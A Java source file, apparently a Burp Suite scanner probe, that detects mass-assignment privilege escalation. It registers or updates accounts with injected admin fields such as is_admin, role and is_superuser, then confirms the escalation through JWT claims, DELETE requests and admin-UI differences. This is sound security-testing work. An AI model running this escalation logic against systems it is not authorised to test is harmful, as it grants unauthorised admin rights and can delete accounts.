package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Mass-assignment / privilege-escalation-on-registration (CWE-915), confirmed by a PRIVILEGE DIFFERENTIAL.
 * Registers a NEW account M whose signup body carries injected privilege fields the client should never set
 * (admin/is_admin/role/is_staff/is_superuser), logs it in, then proves the field TOOK EFFECT: an admin-tier
 * action that our existing NORMAL session (N) is DENIED (401/403) SUCCEEDS (2xx) for M. Identical request, the
 * only difference being the injected field ⇒ zero-FP. The destructive verb (DELETE) targets throwaway accounts
 * WE register, so it never touches seeded or other-users' data.
 *
 * <p>Generic: the register/login shapes come from the two auth-candidate requests discovery already found; field
 * names are matched by category (username/password/email), not hardcoded; the user-collection + delete URL are
 * derived from the register path.</p>
 */
public final class MassAssignProbe extends Probe {
    private String refPage;   // authenticated reference page (form arm): where admin-only UI appears post-escalation

    private static final Pattern PASS  = Pattern.compile("(?i)\"(?:pass(?:word)?|pwd|passwd|secret|clave)\"\\s*:");
    private static final Pattern REG   = Pattern.compile("(?i)regist|sign-?up|create.?user");
    private static final Pattern LOGIN = Pattern.compile("(?i)log-?in|sign-?in|/auth|/token|/session");
    private static final String  PRIV  = "\"admin\":true,\"is_admin\":true,\"isAdmin\":true,\"role\":\"admin\",\"is_staff\":true,\"is_superuser\":true";
    private static final Pattern TOKEN_FIELD = Pattern.compile("(?i)\"(?:auth_?token|access_?token|id_?token|jwt|token|bearer)\"\\s*:\\s*\"([^\"\\n]{8,})\"");
    private static final Pattern JWT   = Pattern.compile("(eyJ[A-Za-z0-9_-]{6,}\\.[A-Za-z0-9_-]{6,}\\.[A-Za-z0-9_-]*)");
    // Form-encoded arm (Rails/PHP self-account update):
    private static final Pattern WRITE_VERB  = Pattern.compile("POST|PUT|PATCH");
    private static final Pattern ACCT_UPDATE = Pattern.compile("(?i)(account|profile|settings|/users?/\\d+|/user\\b|/me\\b|/preferences)");
    // Rails/PHP strong-params wrapper: user[email]=… — matches literal `[` AND the URL-encoded `%5B` (our
    // reconstructed form body is percent-encoded, so a literal-only regex would miss the wrapper and inject nothing).
    private static final Pattern PRIV_NESTED = Pattern.compile("(?i)([A-Za-z_][A-Za-z0-9_]*)(?:\\[|%5B)");
    // An account/profile update body (vs an unrelated /users/{id}/* resource form): carries identity fields or a
    // user/account/profile wrapper — matches literal `[` and URL-encoded `%5B`.
    private static final Pattern ACCT_BODY = Pattern.compile("(?i)(email|first_?name|last_?name|(?:user|account|profile|member)(?:\\[|%5B))");

    public MassAssignProbe(MontoyaApi api, ScanLog scanLog) {
        super(api, scanLog);
    }

    /** @param authCandidates login/register requests discovery surfaced (classified here by path + shape). */
    public int probe(String host, List<HttpRequest> authCandidates, String cookie, String bearer) {
        int r = probeJson(host, authCandidates);                     // JSON register-time injection (bearer APIs)
        if (r > 0) return r;
        return probeFormUpdate(host, cookie, bearer);                // form-encoded self-account UPDATE (Rails/PHP)
    }

    /** ARM 1 — JSON register-time privilege injection (VAmPI/crAPI-style: JSON signup + bearer login + REST DELETE). */
    private int probeJson(String host, List<HttpRequest> authCandidates) {
        HttpRequest reg = null, login = null;
        for (HttpRequest q : candidates(host, authCandidates)) {
            String b = q.bodyToString();
            if (b == null || !b.trim().startsWith("{") || !PASS.matcher(b).find()) continue;
            if (reg == null && REG.matcher(q.path()).find()) reg = q;
            if (login == null && LOGIN.matcher(q.path()).find()) login = q;
        }
        if (reg == null || login == null) {
            scanLog.debug("  mass-assign: no JSON register/login pair observed — skipped");
            return 0;
        }
        scanLog.debug("  mass-assign: reg=" + reg.url() + " login=" + login.url());

        int n = Math.abs((host + reg.path()).hashCode() % 9000);
        String mUser = "aiscma" + n, nUser = "aiscmn" + n, sacA = "aiscsa" + n, sacB = "aiscsb" + n, pw = "AiscMa!" + n;
        // 1. register M (privilege-injected), a NORMAL control N, and two sacrificials — all our own throwaways.
        int mReg = status(register(reg, mUser, pw, true));
        int nReg = status(register(reg, nUser, pw, false));
        status(register(reg, sacA, pw, false));
        status(register(reg, sacB, pw, false));
        scanLog.debug("  mass-assign: register M(" + mUser + ")->HTTP " + mReg + ", N->HTTP " + nReg);
        // A STRICT / mass-assignment register INSERTs every field it receives, so the full privilege+email superset
        // 500s on columns the app lacks (opposite of a lenient API that ignores extras — e.g. an app that only knows
        // is_admin chokes on admin/role/is_staff/…). Retry MINIMAL {username,password,<one priv field>}, one field at
        // a time, so a single valid privilege column still lands and the differential below can run.
        if (mReg < 0 || mReg >= 400) {
            for (String pf : PRIV_FIELDS) {
                String mu = mUser + "m", nu = nUser + "m";
                int ms2 = status(registerMinimal(reg, mu, pw, pf));
                int ns2 = status(registerMinimal(reg, nu, pw, null));
                if (ms2 >= 200 && ms2 < 400) {
                    mUser = mu; nUser = nu; mReg = ms2; nReg = ns2;
                    scanLog.debug("  mass-assign: minimal register {" + pf + "} → M HTTP " + ms2 + ", N HTTP " + ns2);
                    break;
                }
            }
        }
        if (mReg < 0 || mReg >= 400) return 0;                                   // registration rejected → can't test
        // 2. log BOTH M and the normal control N in (using their OWN tokens ⇒ a clean same-role-minus-priv diff).
        // Log BOTH M and control N in — trying EVERY login candidate (the register↔login pair isn't always the
        // sibling the first heuristic picked; a user registered at /register may log in at /login, not the merchant
        // endpoint). Their OWN tokens ⇒ a clean same-role-minus-privilege diff.
        String tokenM = loginAny(host, authCandidates, mUser, pw);
        String tokenN = loginAny(host, authCandidates, nUser, pw);
        scanLog.debug("  mass-assign: tokens M=" + (tokenM != null) + " N=" + (tokenN != null));
        // JWT-READBACK differential (zero-FP, no admin endpoint required): M's OWN issued token decodes to an
        // elevated privilege claim (is_admin/role/…) the control N's token lacks. The issued token reflects the
        // account's REAL privilege (not an echo of our input), and N rules out the app default ⇒ the client-set
        // field elevated the account. Catches escalation whose admin action isn't a sibling of the register path.
        if (privElevatedJwt(tokenM) && !privElevatedJwt(tokenN)) {
            scanLog.found("Mass-assignment — privilege escalation on registration (CWE-915)", reg.url(),
                    "Registering with an injected privilege field (admin/is_admin/role/is_staff/is_superuser) produced "
                    + "an account whose OWN login token carries an elevated privilege claim that an identical control "
                    + "registration WITHOUT the field does not — the client set a privilege it must not, and it took "
                    + "effect (CWE-915, mass assignment / privilege escalation).", (HttpRequestResponse) null);
            scanLog.incFinding();
            return 1;
        }
        if (tokenM == null || tokenN == null) return 0;

        // 3. privilege differential on an admin-tier DELETE (derived user-collection + {id}): N denied, M allowed.
        String collRoot = reg.url().substring(0, reg.url().lastIndexOf('/'));   // …/register → …/users/v1
        int ns = status(send(HttpRequest.httpRequestFromUrl(collRoot + "/" + sacA).withMethod("DELETE"), null, null, tokenN));
        int ms = status(send(HttpRequest.httpRequestFromUrl(collRoot + "/" + sacB).withMethod("DELETE"), null, null, tokenM));
        scanLog.debug("  mass-assign: DELETE differential — N->HTTP " + ns + ", M->HTTP " + ms + " @ " + collRoot + "/{user}");
        if (ns >= 200 && ns < 300) return 0;                                     // normal N could ALSO do it ⇒ not a priv escalation (open/BFLA, not mass-assign)
        if (ms >= 200 && ms < 300) {
            HttpRequestResponse ev = send(HttpRequest.httpRequestFromUrl(collRoot + "/" + sacA).withMethod("DELETE"), null, null, tokenM);
            scanLog.found("Mass-assignment — privilege escalation on registration (CWE-915)", reg.url(),
                    "Registering with injected privilege field(s) (admin/is_admin/role/is_staff/is_superuser) produced an "
                    + "account that performs an admin-tier action — DELETE " + collRoot + "/{user} → HTTP " + ms + " — which "
                    + "our NORMAL session is DENIED (HTTP " + ns + "). The client-unsettable field elevated the account; "
                    + "same request, the only difference is the injected field (CWE-915, privilege escalation).",
                    ev != null ? ev : null);
            scanLog.incFinding();
            return 1;
        }
        return 0;
    }

    /** ARM 2 — form-encoded self-account privilege escalation (classic Rails/PHP mass-assignment): our own
     *  authenticated account-UPDATE form (profile/settings/user) accepts a client-unsettable privilege param
     *  (admin/role/is_admin — flat OR framework-nested user[admin]) that ELEVATES the account. Zero-FP via a state
     *  differential: an admin-tier route DENIED to our session BEFORE the update becomes ALLOWED AFTER it, the only
     *  change being the injected param. Escalates only OUR OWN throwaway session; never touches other users' data. */
    private int probeFormUpdate(String host, String cookie, String bearer) {
        if ((cookie == null || cookie.isBlank()) && (bearer == null || bearer.isBlank())) return 0;   // need our session
        refPage = null;
        // 1. PRIMARY — reconstruct the update from OUR OWN account-settings form (discovered via the authenticated
        //    landing nav). This targets the CURRENT session's user AND sets refPage to that authenticated page (whose
        //    nav carries the admin-only UI the oracle diffs), so it's reliable regardless of what the crawl captured.
        HttpRequest upd = updateFromForm(host, cookie, bearer);
        // 2. Fallback — an account/profile-shaped form-encoded UPDATE already in the site map (identity fields or a
        //    user/account wrapper; NOT an unrelated /users/{id}/* resource like paid_time_off/pay).
        if (upd == null) {
            try {
                for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                    HttpRequest q = rr.request();
                    if (q == null || !host.equalsIgnoreCase(hostOf(q.url()))) continue;
                    if (!WRITE_VERB.matcher(q.method()).matches()) continue;
                    String b = q.bodyToString();
                    if (b == null || b.isBlank() || b.trim().startsWith("{")) continue;  // form-encoded only (JSON = arm 1)
                    if (!b.contains("=") || !ACCT_UPDATE.matcher(q.path()).find()) continue;
                    if (!ACCT_BODY.matcher(b).find()) continue;                           // account/profile update only
                    upd = q; break;
                }
            } catch (Throwable ignore) { }
        }
        if (upd == null) { scanLog.debug("  mass-assign(form): no form-encoded self-account update request/form observed — skipped"); return 0; }

        // 2. BASELINE: an AUTHENTICATED reference page carrying the app's nav/sidebar, whose admin-only element(s) are
        //    gated by an `is_admin?`-style check. Prefer the form page (updateFromForm sets it); else find an authed
        //    landing (the app root is often the LOGIN page, which has no sidebar → the diff would always be empty).
        String origin = originOf(upd.url());
        String ref = refPage != null ? refPage : authedRefPage(origin, cookie, bearer);
        java.util.Set<String> adminBefore = adminMarkers(body(send(HttpRequest.httpRequestFromUrl(ref).withMethod("GET"), cookie, bearer, null)));

        // 3. replay the account update with injected privilege params (flat + the form's own wrapper, e.g. user[admin]).
        String injected = injectPrivParams(upd.bodyToString());
        if (injected.equals(upd.bodyToString())) return 0;
        int upStatus = status(send(upd.withBody(injected), cookie, bearer, null));
        scanLog.debug("  mass-assign(form): update=" + Net.stripQuery(upd.url()) + " injected → HTTP " + upStatus
                + " (ref=" + Net.stripQuery(ref) + ", admin-markers-before=" + adminBefore.size() + ")");
        if (upStatus >= 400) return 0;                                       // update rejected → the field didn't take

        // 4. DIFFERENTIAL: admin-only UI element(s) that appear on the SAME page AFTER but not BEFORE ⇒ the injected
        //    privilege flag took effect (is_admin? now true). Same session; only difference is the injected field.
        HttpRequestResponse afterRr = send(HttpRequest.httpRequestFromUrl(ref).withMethod("GET"), cookie, bearer, null);
        String after = body(afterRr);
        // NOTE: do NOT gate on looksLikeLogin here — an account/profile page legitimately carries a change-password
        // input, which that check false-positives. The admin-marker DIFFERENTIAL is self-correcting: a genuine
        // login bounce has no admin nav markers, so `gained` stays empty and no finding is raised.
        java.util.Set<String> gained = adminMarkers(after);
        gained.removeAll(adminBefore);
        scanLog.debug("  mass-assign(form): admin markers gained after escalation = " + gained);
        if (!gained.isEmpty()) {
            scanLog.found("Mass-assignment — privilege escalation via account update (CWE-915)", upd.url(),
                    "The account-update form " + Net.stripQuery(upd.url()) + " accepted a client-unsettable privilege "
                    + "parameter (admin/role/is_admin — flat or framework-nested, e.g. user[admin]). Replaying it on OUR "
                    + "OWN account made admin-only interface element(s) " + gained + " appear on " + Net.stripQuery(ref)
                    + " that were absent before — same session, the only change being the injected field, so the field "
                    + "elevated the account (CWE-915, mass assignment / privilege escalation).", afterRr);
            scanLog.incFinding();
            return 1;
        }
        return 0;
    }

    /** Reconstruct the account-UPDATE request from a captured account-settings/edit FORM page (a GET response with
     *  an account form): action + all field values (keeping our own) + Rails hidden _method verb override. Lets the
     *  form arm fire even when the crawl only viewed the form. Generic — keyed on an account form, no app paths. */
    private HttpRequest updateFromForm(String host, String cookie, String bearer) {
        Pattern FORM  = Pattern.compile("(?is)<form\\b[^>]*>.*?</form>");
        Pattern INPUT = Pattern.compile("(?is)<(input|select|textarea)\\b[^>]*>");
        Pattern WRAP  = Pattern.compile("(?i)name=[\"']?(user|account|profile|member)\\[");           // Rails/PHP strong-params wrapper
        Pattern LOGINACT = Pattern.compile("(?i)(session|/login|sign-?in|/auth\\b|logout|password_?reset|forgot)");
        // candidate account pages from the site map (path signal only), deduped.
        java.util.LinkedHashSet<String> pages = new java.util.LinkedHashSet<>();
        String origin = null;
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                HttpRequest q = rr.request();
                if (q == null || !host.equalsIgnoreCase(hostOf(q.url()))) continue;
                if (origin == null) origin = originOf(q.url());
                if (ACCT_UPDATE.matcher(q.path()).find()) pages.add(q.url().split("#")[0]);
            }
        } catch (Throwable ignore) { }
        // The crawl may never have reached the account page (its own settings link often lives only in the
        // authenticated nav/sidebar). Proactively harvest it: GET a few authenticated LANDING pages with our
        // session and follow any account-settings/profile/edit link. Generic — self-account discovery, no app paths.
        if (origin != null) {
            Pattern ACCT_HREF = Pattern.compile("(?i)href=[\"']([^\"']*(?:account_settings|/edit|/account\\b|/profile|/settings|/preferences|/me\\b)[^\"']*)[\"']");
            for (String lp : new String[]{ "", "/dashboard/home", "/dashboard", "/account", "/profile", "/settings", "/me", "/home" }) {
                if (pages.size() >= 8) break;
                String lb = body(send(HttpRequest.httpRequestFromUrl(origin + lp).withMethod("GET"), cookie, bearer, null));
                if (lb == null) continue;
                Matcher hm = ACCT_HREF.matcher(lb);
                while (hm.find() && pages.size() < 12) {
                    try { pages.add(java.net.URI.create(origin + lp + "/").resolve(hm.group(1)).toString().split("#")[0]); }
                    catch (Exception ignore) { }
                }
            }
        }
        scanLog.debug("  mass-assign(form): " + pages.size() + " candidate account page(s); session cookie="
                + (cookie != null && !cookie.isBlank()) + " bearer=" + (bearer != null && !bearer.isBlank()));
        for (String pageUrl : pages) {
            // Re-GET FRESH with our session: the crawl's STORED body can be a stale-session LOGIN BOUNCE (its path
            // still matches account_settings but the body is the login page → we'd wrongly parse the /sessions form).
            HttpRequestResponse pr = send(HttpRequest.httpRequestFromUrl(pageUrl).withMethod("GET"), cookie, bearer, null);
            String body = body(pr);
            scanLog.debug("  mass-assign(form): page " + Net.stripQuery(pageUrl) + " → HTTP " + status(pr)
                    + " wrapForm=" + (body != null && WRAP.matcher(body).find()));
            if (body == null) continue;
            Matcher fm = FORM.matcher(body);
            while (fm.find()) {
                String form = fm.group();
                // The account-UPDATE form: carries a framework wrapper (user[…]) OR both first+last name, and does
                // NOT post to a login/session/auth endpoint. This rejects the login form (action=/sessions, no wrapper).
                boolean acct = WRAP.matcher(form).find()
                        || (Pattern.compile("(?i)first_?name").matcher(form).find() && Pattern.compile("(?i)last_?name").matcher(form).find());
                if (!acct) continue;
                String open = form.substring(0, form.indexOf('>') + 1);
                String action = attr(open, "action");
                if (action != null && LOGINACT.matcher(action).find()) continue;    // never the login/logout/reset form
                String actionUrl;
                try { actionUrl = action == null || action.isBlank() ? pageUrl : java.net.URI.create(pageUrl).resolve(action).toString(); }
                catch (Exception e) { actionUrl = pageUrl; }
                if (LOGINACT.matcher(actionUrl).find()) continue;
                StringBuilder fb = new StringBuilder(); String method = "POST";
                Matcher im = INPUT.matcher(form);
                while (im.find()) {
                    String tag = im.group(), name = attr(tag, "name");
                    if (name == null || name.isBlank()) continue;
                    String value = attr(tag, "value"); value = value == null ? "" : value;
                    if (name.equals("_method")) { if (!value.isBlank()) method = value.toUpperCase(); continue; }   // Rails verb override
                    String type = attr(tag, "type");
                    if ("submit".equalsIgnoreCase(type) || "button".equalsIgnoreCase(type) || "reset".equalsIgnoreCase(type)) continue;
                    if (fb.length() > 0) fb.append('&');
                    fb.append(enc(name)).append('=').append(enc(value));
                }
                if (fb.length() == 0) continue;
                String finalBody = method.equals("POST") ? fb.toString() : "_method=" + method.toLowerCase() + "&" + fb;   // Rails: POST + _method
                refPage = pageUrl;   // this authenticated form page carries the nav/sidebar → the escalation oracle page
                scanLog.debug("  mass-assign(form): reconstructed update from form @ " + Net.stripQuery(actionUrl)
                        + " (_method=" + method + ", page=" + Net.stripQuery(pageUrl) + ")");
                return HttpRequest.httpRequestFromUrl(actionUrl).withMethod("POST")
                        .withHeader("Content-Type", "application/x-www-form-urlencoded").withBody(finalBody);
            }
        }
        return null;
    }

    private static String attr(String tag, String name) {
        Matcher m = Pattern.compile("(?is)\\b" + name + "\\s*=\\s*(\"([^\"]*)\"|'([^']*)'|([^\\s>]+))").matcher(tag);
        if (!m.find()) return null;
        return m.group(2) != null ? m.group(2) : m.group(3) != null ? m.group(3) : m.group(4);
    }

    private static String enc(String s) { return java.net.URLEncoder.encode(s == null ? "" : s, java.nio.charset.StandardCharsets.UTF_8); }

    /** An AUTHENTICATED landing page (2xx, not a 302→login bounce) carrying the app's nav/sidebar — the escalation
     *  differential's reference when the form page isn't known. The app root is often the login page, so try
     *  conventional authenticated landings first. Generic — no per-app paths beyond conventional names. */
    private String authedRefPage(String origin, String cookie, String bearer) {
        for (String lp : new String[]{ "/dashboard/home", "/dashboard", "/account", "/profile", "/home", "/me", "/" }) {
            HttpRequestResponse rr = send(HttpRequest.httpRequestFromUrl(origin + lp).withMethod("GET"), cookie, bearer, null);
            int st = status(rr); String b = body(rr);
            if (st >= 200 && st < 300 && b != null && b.contains("href=")) return origin + lp;   // authed (not 302→login)
        }
        return origin + "/";
    }

    private static String originOf(String url) {
        try { java.net.URI u = java.net.URI.create(url); return u.getScheme() + "://" + u.getAuthority(); }
        catch (Exception e) { int i = url.indexOf("://"); int j = i > 0 ? url.indexOf('/', i + 3) : -1; return j > 0 ? url.substring(0, j) : url; }
    }

    /** Admin-only UI markers in a page: links whose href/text signal an admin area (an `is_admin?`-gated nav
     *  section, admin listing/analytics link). Used for the before/after escalation differential. Generic. */
    private static java.util.Set<String> adminMarkers(String html) {
        java.util.LinkedHashSet<String> out = new java.util.LinkedHashSet<>();
        if (html == null) return out;
        Matcher m = Pattern.compile("(?i)href=[\"']([^\"']*\\badmin[^\"']*)[\"']"
                + "|>\\s*(admin[a-z ]*|all[ _]?users|analytics|manage[ _]?users|administrator)\\s*<").matcher(html);
        while (m.find() && out.size() < 12) {
            String tok = m.group(1) != null ? m.group(1) : m.group(2);
            if (tok != null && !tok.isBlank()) out.add(tok.trim().toLowerCase().replaceAll("\\s+", " "));
        }
        return out;
    }

    private static String body(HttpRequestResponse rr) {
        try { return rr != null && rr.response() != null ? rr.response().bodyToString() : null; } catch (Throwable t) { return null; }
    }


    /** Append privilege params in flat form AND, if the body uses a framework wrapper (Rails user[…]=), nested form. */
    private static String injectPrivParams(String body) {
        StringBuilder sb = new StringBuilder(body);
        for (String kv : new String[]{ "admin=true", "is_admin=true", "isAdmin=true", "role=admin", "is_staff=true", "is_superuser=true", "user_type=admin", "admin=1" })
            sb.append('&').append(kv);
        Matcher w = PRIV_NESTED.matcher(body);
        if (w.find()) {
            String wrap = w.group(1);
            for (String f : new String[]{ "admin", "is_admin", "isAdmin", "role", "is_staff", "is_superuser", "user_type" }) {
                String v = (f.equals("role") || f.equals("user_type")) ? "admin" : "true";
                sb.append('&').append(wrap).append("%5B").append(f).append("%5D=").append(v);   // wrap[field]=v (URL-encoded [])
            }
        }
        return sb.toString();
    }

    // ---- helpers ----

    private List<HttpRequest> candidates(String host, List<HttpRequest> authCandidates) {
        java.util.List<HttpRequest> out = new java.util.ArrayList<>();
        if (authCandidates != null) for (HttpRequest q : authCandidates)
            try { if ("POST".equals(q.method()) && host.equalsIgnoreCase(hostOf(q.url()))) out.add(q); } catch (Throwable ignore) { }
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                HttpRequest q = rr.request();
                if ("POST".equals(q.method()) && host.equalsIgnoreCase(hostOf(q.url()))) out.add(q);
            }
        } catch (Throwable ignore) { }
        return out;
    }

    private HttpRequestResponse register(HttpRequest tmpl, String user, String pass, boolean privileged) {
        String b = tmpl.bodyToString();
        b = setField(b, "username|user|login|userName|name|handle", user);
        b = setField(b, "password|pass|pwd|passwd|secret", pass);
        b = setField(b, "email|mail|e-?mail", user + "@example.com");
        if (privileged) {
            int c = b.lastIndexOf('}');
            if (c > 0) b = b.substring(0, c).replaceAll(",\\s*$", "") + "," + PRIV + "}";
        }
        return send(tmpl.withBody(b), null, null, null);
    }

    private String login(HttpRequest tmpl, String user, String pass) {
        String b = tmpl.bodyToString();
        b = setField(b, "username|user|login|userName|name|handle|email|mail", user);
        b = setField(b, "password|pass|pwd|passwd|secret", pass);
        HttpRequestResponse rr = send(tmpl.withBody(b), null, null, null);
        if (rr == null || rr.response() == null) return null;
        String rb = rr.response().bodyToString();
        if (rb == null) return null;
        Matcher t = TOKEN_FIELD.matcher(rb); if (t.find()) return t.group(1);
        Matcher j = JWT.matcher(rb);          if (j.find()) return j.group(1);
        return null;
    }

    /** Log a user in by trying EVERY JSON login candidate discovery surfaced (the register↔login pair isn't always
     *  the sibling the first heuristic picks). Returns the first token obtained, or null. */
    private String loginAny(String host, List<HttpRequest> authCandidates, String user, String pass) {
        for (HttpRequest q : candidates(host, authCandidates)) {
            try {
                String b = q.bodyToString();
                if (b == null || !b.trim().startsWith("{") || !LOGIN.matcher(q.path()).find()) continue;
                String tok = login(q, user, pass);
                if (tok != null) return tok;
            } catch (Throwable ignore) { }
        }
        return null;
    }

    // Privilege fields injected ONE AT A TIME for the minimal-body retry — a mass-assignment register INSERTs each
    // field it receives, so a single valid privilege column (e.g. is_admin) lands even when the full superset 500s
    // on columns the app lacks. Generic field names, not app-specific.
    private static final String[] PRIV_FIELDS = {
            "\"is_admin\":true", "\"isAdmin\":true", "\"admin\":true",
            "\"role\":\"admin\"", "\"is_staff\":true", "\"is_superuser\":true"
    };
    private static final Pattern PRIV_ELEVATED = Pattern.compile(
            "(?i)\"(?:is_?admin|isadmin|admin|is_?staff|is_?superuser|superuser)\"\\s*:\\s*true"
            + "|\"role\"\\s*:\\s*\"(?:admin|administrator|superuser|staff|root)\"");
    /** True when a JWT's decoded payload carries an elevated privilege claim (the account's REAL privilege as the
     *  app issued it — not an echo of our request body). */
    private static boolean privElevatedJwt(String token) {
        if (token == null) return false;
        Matcher jm = JWT.matcher(token);
        String jwt = jm.find() ? jm.group(1) : (token.chars().filter(c -> c == '.').count() == 2 ? token : null);
        if (jwt == null) return false;
        try {
            String[] p = jwt.split("\\.");
            if (p.length < 2) return false;
            String pad = "====".substring(0, (4 - p[1].length() % 4) % 4);
            String payload = new String(java.util.Base64.getUrlDecoder().decode(p[1] + pad),
                    java.nio.charset.StandardCharsets.UTF_8);
            return PRIV_ELEVATED.matcher(payload).find();
        } catch (Throwable t) { return false; }
    }
    /** Minimal JSON signup body — {username,password[,<one priv field>]}, Content-Type application/json — for the
     *  retry against a strict / mass-assignment register that 500s on the full field superset. */
    private HttpRequestResponse registerMinimal(HttpRequest tmpl, String user, String pass, String privJson) {
        String b = "{\"username\":\"" + user + "\",\"password\":\"" + pass + "\""
                + (privJson == null ? "" : "," + privJson) + "}";
        HttpRequest req = tmpl.withBody(b);
        if (!req.hasHeader("Content-Type")) req = req.withHeader("Content-Type", "application/json");
        return send(req, null, null, null);
    }

    private static String setField(String body, String namePat, String value) {
        Matcher m = Pattern.compile("(?i)(\"(?:" + namePat + ")\"\\s*:\\s*)\"[^\"\\n]*\"").matcher(body);
        return m.find() ? m.replaceFirst("$1\"" + Matcher.quoteReplacement(value) + "\"") : body;
    }

    private HttpRequestResponse send(HttpRequest req, String cookie, String bearer, String bearerM) {
        try {
            HttpRequest r = req;
            String bt = bearerM != null ? bearerM : bearer;
            if (cookie != null && !cookie.isBlank()) r = r.withHeader("Cookie", cookie);
            if (bt != null && !bt.isBlank()) r = r.withHeader("Authorization", "Bearer " + bt);
            return send(r);
        } catch (Throwable t) { return null; }
    }

    private static int status(HttpRequestResponse rr) {
        try { return rr != null && rr.response() != null ? rr.response().statusCode() : -1; } catch (Throwable t) { return -1; }
    }

    // hostOf(String) inherited from Probe.
}
